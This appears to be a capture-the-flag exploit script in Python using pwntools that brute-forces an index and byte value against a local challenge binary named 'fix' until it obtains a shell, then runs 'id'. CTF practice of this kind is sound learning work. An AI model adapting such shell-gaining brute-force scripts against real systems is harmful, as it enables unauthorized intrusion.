#!/usr/bin/python
from pwn import *
import sys

#context.log_level = 'debug'
for i in range(15, 23):
	for j in range(0, 0xff+1):
		r = process('./fix')
		#r.interactive()
		#r.recvuntil('Can you fix it for me?\n')	
		
		r.sendline(str(i))
		r.sendline(str(j))
		r.recvuntil('get shell\n')
		print i, j
		try:
			r.sendline('id')
			r.recv(100)	
			r.interactive()
		except:
			print 'sorry..'
			r.close()
			continue

r.interactive()
